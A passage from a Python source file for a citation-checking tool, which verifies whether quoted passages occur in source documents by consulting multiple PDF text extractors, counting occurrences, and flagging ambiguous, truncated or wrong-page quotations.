        quote, got.text, artifact, page if paginated else None, warn, got.extractor, prefix, suffix
    )
    result.extractor = got.extractor
    result.extraction_digest = _digest(got.text)
    result.fallback = got.fallback
    result.fallback_reason = got.fallback_reason

    # One reader saying no is not the document saying no. Only on a paginated source: the text
    # of a `.txt` is its bytes, and there is no second way to read them.
    if result.state == "not found" and is_paginated(artifact):
        consulted = [got.extractor]
        rescued = _second_opinion(
            quote, artifact, page if paginated else None, warn, got.extractor, prefix, suffix
        )
        if rescued is not None:
            return rescued
        consulted += [n for n in available_extractors() if n != got.extractor]
        result.detail = (
            f"not found by any of {', '.join(dict.fromkeys(consulted))}; the passage is absent "
            f"from this document under every reader installed here"
        )
    return result


def _second_opinion(
    quote: str,
    artifact: pathlib.Path,
    page: int | None,
    warn: list[str],
    missed_by: str,
    prefix: str = "",
    suffix: str = "",
) -> Result | None:
    """Ask the other readers before reporting a passage absent. `None` if none of them finds it.

    `not found` is an accusation against the manuscript -- the source was read and the passage
    is not in it -- and one reader is not enough to make it. `-layout` preserves a page's
    visual geometry, so on a two-column paper it interleaves the columns and shreds every
    sentence that spans the gutter. Measured on `dai_2022_knowledge_neurons.pdf`: 110 of 160
    quotations read as absent under `pdftotext -layout` and 157 resolve under pypdf. Nothing
    was wrong with the quotations, and an audit reported 110 failures against a claim whose
    source contains the text.

    Detecting the column layout was the alternative and is a worse instrument: it guesses at a
    property this measures. Asking the next reader answers the same question exactly, and only
    on the path where the first answer was going to be an accusation.

    Reached on `not found` alone. Never on `ambiguous`: a passage occurring twice is in the
    document, and a reader that merges columns could "resolve" the ambiguity by hiding an
    occurrence, which loses the evidence rather than settling it.

    A rescued passage is recorded as a fallback naming both readers, so it never becomes
    indistinguishable from one the declared reader found itself.
    """
    for name in available_extractors():
        if name == missed_by:
            continue
        try:
            got = reading_with(artifact, extractor=name)
        except SourceUnreadableError:
            continue
        if not got.text.strip() or resolve_in(quote, got.text, prefix, suffix).state != "found":
            continue
        result = _verdict(quote, got.text, artifact, page, warn, name, prefix, suffix)
        result.extractor = name
        result.extraction_digest = _digest(got.text)
        result.fallback = True
        result.fallback_reason = f"{missed_by} did not find this passage; {name} did"
        return result
    return None


def _triangulate(
    quote: str,
    artifact: pathlib.Path,
    page: int | None,
    warn: list[str],
    prefix: str = "",
    suffix: str = "",
) -> Result:
    """Ask every installed extractor, and report disagreement as disagreement.

    An extractor that could not open the file contributes no verdict rather than a `not
    found`: "this reader failed" and "this reader read it and the passage is not there" are
    the two facts the outcome model exists to keep apart, and pooling them here would smuggle
    the first into the second one level down.

    The two poppler modes are one binary and are not independent of each other, so their
    agreeing is weaker evidence than poppler agreeing with pypdf. What they are here for is
    that they disagree in opposite directions, and a disagreement between them is the case
    `indeterminate` exists to report rather than to resolve.
    """
    verdicts: dict[str, Result] = {}
    reasons: list[str] = []
    for name in available_extractors():
        try:
            got = reading_with(artifact, extractor=name)
        except SourceUnreadableError as e:
            reasons.append(e.detail)
            continue
        if not got.text.strip():
            reasons.append(f"{name}: no text extracted")
            continue
        verdicts[name] = _verdict(quote, got.text, artifact, page, warn, name, prefix, suffix)
        verdicts[name].extraction_digest = _digest(got.text)

    if not verdicts:
        return Result("unchecked", "; ".join(reasons) + _hint(artifact), list(warn))

    agreement = {name: r.state for name, r in verdicts.items()}
    # The preferred extractor that reached a verdict carries the warnings and the page
    # finding: they describe the text, and merging warnings from readings that disagree about
    # the text would attribute to one document what two extractions said.
    lead = next(name for name in available_extractors() if name in verdicts)
    result = verdicts[lead]
    result.extractor = lead
    result.fallback = lead != DEFAULT_EXTRACTOR
    result.agreement = agreement

    if len(set(agreement.values())) > 1:
        said = ", ".join(f"{name} {state}" for name, state in agreement.items())
        return Result(
            "indeterminate",
            f"extractors disagree ({said}); the document is not determinate under them",
            list(warn),
            extractor=lead,
            extraction_digest=result.extraction_digest,
            fallback=result.fallback,
            agreement=agreement,
        )
    return result


def _count(needle: str, doc: str) -> int:
    """Occurrences of `needle` in `doc` that land on a token boundary.

    A passage whose last character is alphanumeric and which is followed by another is a
    shared prefix rather than an occurrence: `the catalog` inside `the catalogue` is not the
    document saying `the catalog` a second time. Counting those would report a passage as
    ambiguous because some longer word happens to begin with it.

    Where no occurrence lands cleanly the total is returned instead. A quotation that only
    ever cuts a word stays `found` and keeps its `truncated` warning, which is the behaviour
    `_cuts_a_token` exists to produce and states as its own rule: a quote that lands cleanly
    somewhere in the document is quoting that place.
    """
    if not needle:
        return 0
    cuts_matter = needle[-1].isalnum()
    total = clean = 0
    at = doc.find(needle)
    while at >= 0:
        total += 1
        after = at + len(needle)
        if not cuts_matter or after >= len(doc) or not doc[after].isalnum():
            clean += 1
        at = doc.find(needle, at + 1)
    return clean or total


def _occurrences(
    quote: str, doc: str, prefix: str, suffix: str, transform: Callable[[str], str]
) -> tuple[int, bool]:
    """How often the passage occurs in `doc`, and whether its anchors single one out.

    `doc` arrives already transformed; the quotation and its anchors are transformed here, so
    both sides of every comparison went through the same function.

    A count, where this was a substring test. `passage in document` answers a weaker question
    than the record asks: a quotation points at one passage, and a pointer resolving to three
    of them has identified none of them. Where the passage repeats, the anchors are joined to
    it and the joined form is counted instead, which is how the record says which occurrence
    it meant. Joined and then folded, rather than folded and then joined, because folding
    collapses the whitespace across each seam exactly as it collapsed it in the document.
    """
    q = transform(quote)
    if not q:
        return 0, False
    n = _count(q, doc)
    if n <= 1:
        return n, n == 1
    if not (prefix or suffix):
        return n, False
    return n, _count(transform(prefix + quote + suffix), doc) == 1


@dataclass(frozen=True)
class Match:
    """Whether a passage occurs in a text, how often, and how hard the match had to work."""

    state: State
    count: int
    """Occurrences that count under `_count`. Zero where the passage is not there."""
    normalized: bool
    """Whether it resolved only on the whitespace-stripped skeleton, which is the weaker
    match and is reported as a warning wherever a `Result` is produced."""


def resolve_in(quote: str, text: str, prefix: str = "", suffix: str = "") -> Match:
    """Does this passage occur in this text, and does it occur exactly once?

    The verdict without a file. `check_one` reads an artifact and then decides; this decides
    against text the caller already holds. A tool that does its own extraction needs that seam
    in order to share these matching rules instead of reimplementing them, and reimplementing
    them is how a second normalizer ends up folding `-0.42` and `0.42` together while the
    first one does not.

    Verbatim first, then the whitespace-stripped skeleton. Never `unchecked` or
    `indeterminate`: both are facts about reading a source, and this one was handed a text.
    """
    if not fold(quote):
        return Match("not found", 0, False)
    n, singled = _occurrences(quote, fold(text), prefix, suffix, fold)
    if n:
        return Match("found" if singled else "ambiguous", n, False)
    k, k_singled = _occurrences(quote, skeleton(text), prefix, suffix, skeleton)
    if k:
        return Match("found" if k_singled else "ambiguous", k, True)
    return Match("not found", 0, False)


def _ambiguous(n: int, anchored: bool) -> str:
    """Why an ambiguous verdict obtained, and what would settle it."""
    if anchored:
        return (
            f"the passage occurs {n} times and its prefix/suffix do not single one out; "
            f"widen them until exactly one occurrence carries both"
        )
    return (
        f"the passage occurs {n} times in the source, so the record does not say which of "
        f"them it means; add `prefix`/`suffix` naming the text on either side"
    )


def _verdict(
    quote: str,
    full: str,
    artifact: pathlib.Path,
    page: int | None,
    warn: list[str],
    extractor: str = "",
    prefix: str = "",
    suffix: str = "",
) -> Result:
    """The verdict on one passage, against the text an extractor produced.

    Verbatim first, then the whitespace-stripped skeleton, and a count at each level rather
    than a membership test. A passage occurring more than once is `ambiguous` and not `found`:
    the source contains it, and the record has not said which occurrence it is quoting, so any
    page or section attached to it is asserted about a passage nobody identified.
    """
    warn = list(warn)
    q, doc = fold(quote), fold(full)
    if not q:
        # `"" in doc` is True. A quotation that folds away entirely is not a quotation.
        return Result("not found", "the quotation is empty after normalization", warn)

    m = resolve_in(quote, full, prefix, suffix)
    if m.normalized:
        warn.append("normalized")
    if m.state == "ambiguous":
        return Result("ambiguous", _ambiguous(m.count, bool(prefix or suffix)), warn)
    if m.state == "not found":
        return Result(
            "not found",
            "read the source: a broken extraction reads the same as a passage that was never there",
            warn,
        )
    if m.normalized:
        # The skeleton dropped the whitespace the token check reads, so neither a cut word
        # nor a page number means anything against it.
        return Result("found", "", warn)
    if _cuts_a_token(q, doc):
        warn.append("truncated")
    if page and not _on_page(artifact, q, page, extractor):
        warn.append("page")
        found_at, capped = _find_page(artifact, q, reader=extractor)
        detail = f"not on page {page}"
        if found_at is None and capped:
            detail += f"; searched the first {PAGE_SCAN_LIMIT} pages"
        return Result("found", detail, warn, found_at)
    return Result("found", "", warn)


def _on_page(artifact: pathlib.Path, folded_quote: str, page: int, extractor: str = "") -> bool:
    """Is the quote on the page the record claims? An unreadable page is not a match.

    Read with the extractor that produced the document's text. Asking a second one which page
    a passage is on would report the disagreement between two extractions as a page number the
    record got wrong.
    """
    try:
        return folded_quote in fold(_page_text(artifact, page, extractor))
    except SourceUnreadableError:
        return False


def _page_text(artifact: pathlib.Path, page: int, extractor: str) -> str:
    """One page's text, from whatever produced the document's text.

    The default path goes back through `extract`, so a caller that replaced it fixes what each
    page says as well as what the document says -- which is what a per-page stub is for, and
    what the wrong-page check depends on.
    """
    if extractor in ("", PLAIN_TEXT, SUBSTITUTED, DEFAULT_EXTRACTOR):
        return extract(artifact, page)
    return reading_with(artifact, page, extractor=extractor).text


def _cuts_a_token(q: str, doc: str) -> bool:
    """Does every occurrence of the quote stop in the middle of a word or a number?

    `"an accuracy of 0.9"` is genuinely present in a source reporting **0.95**, so it is `found`
    and the reader is told a true thing that misstates the result. The same cut turns
    `"We trained 50"` into `"We trained 5"`. This is not the `short` warning: length is not the
    problem, and a long quote ending one digit early is the more convincing version of it.

    Every occurrence must cut, because a quote that lands cleanly somewhere in the document is
    quoting that place.
    """
    if not q or not q[-1].isalnum():
        return False
    at, seen = doc.find(q), False
    while at >= 0:
        seen = True
        after = at + len(q)
        if after >= len(doc) or not doc[after].isalnum():
            return False
        at = doc.find(q, at + 1)
    return seen


def is_paginated(artifact: pathlib.Path) -> bool:
    """Whether asking which page a passage is on means anything for this source."""
    return artifact.suffix.lower() not in TEXT_SUFFIXES


def _find_page(
    artifact: pathlib.Path,
    folded_quote: str,
    limit: int = PAGE_SCAN_LIMIT,
    reader: str = "",
) -> tuple[int | None, bool]:
    """Which page holds the quote, and whether the scan hit its limit without deciding.

    The second element exists so a caller can tell "searched the whole document and it is not
    on any page" from "stopped searching at page N". Reporting both as `None` makes a cap look
    like a finding.

    A source with no pages answers `(None, False)` at once. Extraction ignores the page number
    there, so a scan would return the same text `limit` times and then claim it had searched
    that many pages of a document that has none.
    """
    if not is_paginated(artifact):
        return None, False
    for p in range(1, limit + 1):
        try:
            text = _page_text(artifact, p, reader)
        except SourceUnreadableError:
            return None, False
        if not text:
            return None, False  # ran off the end of the document
        if folded_quote in fold(text):
            return p, False
    return None, True  # still going when the limit ran out
